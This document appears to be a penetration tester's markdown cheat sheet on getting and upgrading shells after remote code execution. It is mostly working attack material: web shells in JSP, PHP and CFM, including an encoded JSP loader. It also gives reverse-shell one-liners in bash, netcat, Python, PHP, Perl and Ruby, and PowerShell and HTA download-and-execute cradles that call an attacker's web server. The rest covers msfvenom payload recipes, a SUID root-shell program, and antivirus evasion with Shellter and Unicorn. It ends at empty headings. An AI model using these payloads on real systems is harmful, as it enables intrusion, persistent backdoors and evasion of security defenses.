# General - Shells

The following note details the procedure and tools that can be used to leverage
a RCE into a fully TTY shell.  

For Windows credentials (password or hashes) reuse, refer to the
Active Directory/Credentials Hunting note.

### Detect firewall filtering

A firewall may be configured on the targeted system to block inbound or outbound
connection (TCP, UDP, ICMP). If TCP / UDP reverse shell attempts are failing
but ICMP packets are received from the target, a firewall may be in deployed.

###### Outgoing traffic blocking

Listen to ICMP traffic on host:

```bash
tcpdump -i <INTERFACE> icmp
```

On target, make ICMP `echo` requests using ping in **background** to prevent
shell lose in case of blocked ping:

```bash
ping -c 4 <IP> &
```
```python
python -c 'import os;  os.popen("ping -c 4 <IP> &");"
```

### Web shells

A web shell is a script written in the supported language of the targeted web
server to be uploaded and executed by the web service. It provides a mean to
execute system commands on the target.

A collection of web shells for various languages is accessible on `GitHub`:

```
https://github.com/xl7dev/WebShell

# Backup fork
https://github.com/Qazeer/WebShell
```

Kali Linux also comes with a *smaller* collection of web shell, located in:

```
/usr/share/webshells
```

#### JSP

###### Basic

`JSP` one-liner without output to execute system commands through GET
parameters:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

###### SecurityRiskAdvisors'

The SecurityRiskAdvisors' `cmd.jsp` web shell provides command execution and
file upload capability while being as small and widely compatible as possible.

Once uploaded on the target system, load the following `JavaScript` code
using the browser console to activate the user interface:

```
javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);
```

#### PHP

###### Basic  

Basic PHP code to execute system commands through GET parameters:

```php
<?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
<?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
<?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
```

###### Stealthy  

Instead of passing the commands through the URL, which would appear in logs,
heades parameters can be used:

```php
$_SERVER['HTTP_ACCEPT_LANGUAGE']
$_SERVER['HTTP_USER_AGENT']
```

###### Obfuscation  

The following functions can be used to obfuscate the code.

```php
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

###### phpbash

phpbash is a simple standalone, semi-interactive web shell.  
Upload the phpbash.php or phpbash.min.php file on the target and access it
with any Javascript-enabled web browser to achieve RCE.

https://github.com/Arrexel/phpbash

###### Weevely  

Weevely is a password protected web shell designed for post-exploitation
purposes that can be extended over the network at runtime.

Upload weevely PHP agent to a target web server to get remote shell access to
it. It has more than 30 modules to assist administrative tasks, maintain access,
provide situational awareness, elevate privileges, and spread into the target
network.  
The agent is a small, polymorphic PHP script hardly detected by AV and the
communication protocol is obfuscated within HTTP requests.

```bash
# Generate the backdoor agent
./weevely.py generate mypassword agent.php
Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.

# Upload the generated agent under the target web folder.
# Make sure that the agent URL is reachable from your position and that it is correctly executed by the web server as PHP code.

# Connect to the agent
./weevely.py http://<TARGET>/agent.php mypassword
weevely>
```

#### CFM

Among others, the ColdFusion Markup Language `cfexec.cfm` web shell, located on
Kali by default at `/usr/share/webshells/cfm/cfexec.cfm`, can be used to execute
system commands on a web server supporting the CFM file format.

To execute `CMD` command on `Windows`, the parameters are as follow:

```
# Path to the cmd binary
Command: c:\windows\system32\cmd.exe

# Command to execute
Options: /c <COMMAND>
```

### Reverse Shells

#### Listener on host

```
# TCP
nc -lvnp <PORT>

# UDP
nc -lvnpu <PORT>

# ICMP
python icmpsh_m.py <HOST_IP> <TARGET_IP>
```

#### One-liners reverse shell

###### Bash

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```

###### Netcat

```
# If nc e option available:
nc -e /bin/sh <IP> <PORT> &
# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
nc.exe -e cmd.exe <IP> <PORT>

# Else (Linux):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

###### Python

```python
# Linux
python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");'
python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

###### PHP   

```php
# Linux
# This code assumes that the TCP connection uses file descriptor 3.
# If it doesn’t work, try 4, 5, 6…
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

###### Perl

```perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Complete reverse shell scripts

The scripts usually need to be uploaded on the target or hosted on a webserver,
which can be done using python:

```python
python -m SimpleHTTPServer <PORT>
```

###### PowerShell  

The Nishang PowerShell scripts can be used to get a reverse shell.
https://github.com/samratashok/nishang  
The following commands will load directly in memory the PowerShell script hosted
on the remote webserver:

```powershell
# TCP
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"

# ICMP - Needs a ICMP listener
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
```

The Powershell script can also be started directly upon download if the invoke
command is added at the end of the script
`Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>`

###### PHP

The pentestmonkey php-reverse-shell PHP script is a proper interactive reverse
shell meant to be uploaded on a web service that runs PHP.

The following two lines need to be updated in the script:

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

The script can also be loaded directly in memory from a remote webserver, which
can be used to leverage a remote command execution into a reverse shell on a
server with PHP available:

```php
curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php

# Through PHP code injection
# The system call be replaced with various PHP functionalities detailed above.  
system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
```

####### [Windows] HTML Application

Windows HTML Application script can contain JavaScript or VBScript that will be
interpreted by the operating system.

The HTA script can be interpreted through `Internet Explorer` or the Windows
utility `mshta.exe`. As the file is not written on disk but directly
interpreted from the remote URL, this technique can be used to bypass
some anti-virus solutions.

The following HTA script can be used to load in memory and execute the Nishang PowerShell `Invoke-PowerShellTcp` cmdlet:

```
<script language="VBScript">
  window.moveTo -4000, -4000
  Set eWZ3pL4 = CreateObject("Wscript.Shell")
  Set gOhlGr = CreateObject("Scripting.FileSystemObject")
  For each path in Split(eWZ3pL4.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If gOhlGr.FileExists(path + "\..\powershell.exe") Then
      eWZ3pL4.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>",0
      Exit For
    End If
  Next
  window.close()
</script>
```

#### Binary

###### [Linux] C binary for SUID shell

The following code can be compiled to get a binary that will spawn a shell with
out dropping the SID bit. Change the owner of the binary if needed
`chown root.root suid` and then set the SUID bit and execution mode of the
compiled binary using `chmod 4755 suid` or `chmod a=srx suid`.  

```
# gcc -m32 -Wl,--hash-style=both -o suid suid.c

int main(void) {
    setgid(0);
		setuid(0);
    execl("/bin/sh", "sh", 0);
}
```

###### Compiled reverse one-liner

If reverse shell must be made through a binary the following c code can be used:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("<SHELLCODE_ONELINER");
	return 0;
}
```

The binary must be compiled on the same architecture as the target (advised to
use the same OS and kernel for Linux targets).

To compile for a Windows target on Linux use the cross-compiler mingw:

```
# 32 bits
i686-w64-mingw32-gcc -o test.exe test.c

# 64 bits
x86_64-w64-mingw32-gcc -o test.exe test.c
```

###### msfvenom reverse shell binary

`msfvenom` can be used to generate a reverse shell binary:

```
# 32 bits
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>

# 64 bits
msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
```

For more information on how to generate and use reverse shell binaries using
the `Metasploit` framework, refer to the `Meterpreter` section below.

###### chashell

Chashell is a cross-platform Go reverse shell that communicates over DNS. It
can be used to bypass firewalls or tightly restricted networks. As `chashell`
relies on DNS, a Domain Name is required and must be bought and configured.  

`chashell` makes use of a (multi-client) control server, `chaserv`, to receive
the reverse shell connections.

The following commands can be used to build the client and server and to
configure the DNS record:

```
# Building
export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
export DOMAIN_NAME=<FQDN>
make build-all

# DNS record configuration
<PREFIX> 300 IN A <SERVE_IP>
c 300 IN NS <PREFIX>.<DOMAIN_NAME>.
```

The `chaserv` binary must be run on the control server and the `chashell`
binary on the compromised host.

### (Optional) TTY

 A TTY is a particular kind of device file which implements a number of
additional commands beyond read and write.

A TTY shell may be needed for an exploit to work and is required to make use of
`sudo`. It is recommended to upgrade any shell obtained to TTY before
attempting privileges escalation techniques.

```
/bin/sh -i
/bin/bash -i
echo os.system('/bin/bash')

# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Perl
perl -e 'exec "/bin/sh";'

# From within IRB
exec "/bin/sh"

# From within vi
:!bash
:set shell=/bin/bash:shell

# With nmap
!sh
```

### (Optional) Auto-completion and commands history

  - Background the reverse shell terminal using `Ctrl+Z`
  - Set host terminal to raw with echo unset: `stty raw -echo`
  - Foreground the reverse shell terminal `fg` and re-initialize it using
    `reset`

If the TERM environment variable is not set on the reverse shell:

```
ctrl+z
echo $TERM
fg
export TERM=<TERM>
```

Lastly, the shell might not be of the correct height or width. To update the
shell height / width to correspond to the terminal size use:

```
ctrl+z
stty size
-> <ROWS> <COLUMNS>
fg
stty -rows <ROWS> -columns <COLUMNS>
```

### Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory
DLL injection stagers and is extended over the network at runtime.  
It communicates over the stager socket and provides a comprehensive
client-side Ruby API.   
It features command history, tab completion, channels, and more.

###### Handler

When using a meterpreter payload, a handler must be started on the host machine.

The commands to start a metasploit handler are as follows:

```
# msfconsole -q

msf> use exploit multi/handler

# Set the payload being executed on the target
msf> set payload <PAYLOAD>

# Set the local IP and port. In case of a NATED VM with port
# forwarding/redirection, the IP 0.0.0.0 can be used  
msf> set LHOST <HOSTIP>
msf> set LPORT <HOSTPORT>

# To be able to keep several sessions at a time on a single multi/handler
msf> set ExitOnSession false
msf> exploit -j -z
```

###### MsfVenom & MSFPC

The metasploit framework msfvenom is a powerful standalone payload generator.

Two kinds of payloads can be generated:
  - Staged payloads that will require a metasploit handler
  - Stageless payloads that will not require a metasploit handler (and will
	  work with netcat for example)

Note that, while offering encoding techniques, the binary payloads generated
with msfvenom are often detected by AV softwares. To generate stealthier binary
payloads use Shellter [(Windows / binary) Shellter].

The MSFvenom Payload Creator (MSFPC) bash script can be used to easily generate
various "basic" Meterpreter payloads via msfvenom:

```
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .exe // .dll]

msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)

msfpc.sh Windows <IP> <PORT> CMD REVERSE STAGELESS TCP
msfpc.sh Windows <IP> <PORT> MSF REVERSE STAGED TCP

msfpc.sh Linux <IP> <PORT> CMD REVERSE STAGELESS TCP
msfpc.sh Linux <IP> <PORT> MSF REVERSE STAGED TCP
```

MsfVenom cheat sheet:

```
# List platforms: msfvenom --help-platforms
# Basic platforms: windows & linux
# Architecture: x86 or x64
# List payloads: msfvenom --list payloads
# List formats: msfvenom --help-formats
# List encoders: msfvenom --list encoders
# Recommended encoder: -e x86/shikata_ga_nai

msfvenom –p <PAYLOAD> [--platform <PLATEFORM>] [-a <ARCHI>] [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LHOST> LPORT=<LPORT> [–f <FORMAT>] > <FILE>

# Windows payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > prompt.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
msfvenom -p windows/meterpreter/bind_tcp LPORT=<PORT> -f exe > bind.exe
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe

# Linux payloads
# Bash oneliner
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
# Basic and stable
msfvenom -p generic/shell_bind_tcp LHOST=<IP> LPORT=<PORT> -f elf > term.elf
# Stageless - CMD shell
msfvenom -p linux/x86/shell_bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_stageless.elf
msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > rev_stageless.elf
msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_x64_stageless.elf
msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > rev_x64_stageless.elf
# Staged - Meterpreter
msfvenom -p linux/x86/meterpreter/bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_meterpreter.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter.elf
msfvenom -p linux/x64/meterpreter/bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_meterpreter_x64.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter_x64.elf

# Mac payloads
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > reverse.macho
msfvenom -p osx/x86/shell_bind_tcp LPORT=<PORT> -f macho > bind.macho

# Web based payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > reverse.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > reverse.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > reverse.war
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# Script payloads
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > reverse.py
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > reverse.pl

# Shellcodes
msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f bash > <FILE>
msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f powershell > <FILE>
```

###### PowerShell

*Invoke-Shellcode*

The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
on the target through PowerShell and in memory execution. This can be used to
bypass AV detection.

The commands to generate a payload, download and execute it on the target are
as follows:

```bash
# x86 target
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1

# x64 target
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1

# Then replace the payload in the Invoke-Shellcode script with the generated payload
# Copy everything from 0xfc to 0xd5 into the $Shellcode32 or $Shellcode64 variables

# Setup a web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload
# python -m SimpleHTTPServer <HOST_PORT>
# msf > use multi/handler ...

# Then download in memory and execute the reverse meterpreter
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
```

###### HTML Application

Windows HTML Application script can contain JavaScript or VBScript that will be
interpreted by the operating system.

The `metasploit` module `exploit/windows/misc/hta_server` can be used to
generate then host a HTA script that will launch a payload through PowerShell
when interpreted.

The HTA script can be interpreted through `Internet Explorer` or the Windows
utility `mshta.exe`. As the file is not written on disk but directly
interpreted from the remote URL, this technique can be used to bypass
some anti-virus solutions.

```
msf> use exploit/windows/misc/hta_server
[...]

mshta.exe http://<HOSTNAME | IP>:<PORT>/<FILENAME>.hta
```


###### Binary

The following C code can be used to compile a binary that will escape some
anti-virus:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;");
	return 0;
}
```

### Anti-Virus bypass tools

###### (Windows / PowerShell) Unicorn

Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
shellcode (custom, cobalt or meterpreter) straight into memory.

*Ensure Metasploit is installed if using Metasploit methods.*

If using meterpreter payloads the script will generate two files :
 - PowerShell_attack.txt
 - unicorn.rc

The text file contains all of the code needed in order to inject the
PowerShell attack into memory and the rc file can be used to start a metesploit
reverse handler.

The commands are as follow:
```bash
python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>

# On host
msfconsole -r unicorn.rc

# On target
# Execute the PowerShell command contained in the powershell_attack.txt file
```

###### (Windows / binary) Shellter

Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE
infector ever created.  
It can be used in order to inject shellcode into native Windows applications
(currently 32-bit applications only). The shellcode can be self made or
generated within Shellter through a framework, such as Metasploit.

The following builtin shellcodes are currently supported:

```
Meterpreter_Reverse_TCP
Meterpreter_Reverse_HTTP
Meterpreter_Reverse_HTTPS
Meterpreter_Bind_TCP
Shell_Reverse_TCP
Shell_Bind_TCP
WinExec
```

The procedure to create a binary is as follow:

```
$ shellter.exe

Choose Operation Mode - Auto/Manual (A/M/H): A
Perform Online Version Check? (Y/N/H): N

PE Target: <BINARY_TO_INJECT_INTO>

[...]

# Check if the chosen binary match the OS version attacked
Minimum Supported Windows OS: 4.0

# Stealth Mode preserves the original functionality of the infected PE file, so "Stealth" refers to the human factor.
# If you just need a backdoor don't enable this feature.
Enable Stealth Mode? (Y/N/H): N

************
* Payloads *
************
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec
# L: One of the above payload
# C: Custom shellcode, a file path must be provided
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1

***************************
* meterpreter_reverse_tcp *
***************************
SET LHOST: <HOSTIP>
SET LPORT: <HOSTPORT>
Payload: meterpreter_reverse_tcp

[...]

Injection: Verified!
Press [Enter] to continue...
```

###### Ebowla

### WinRM
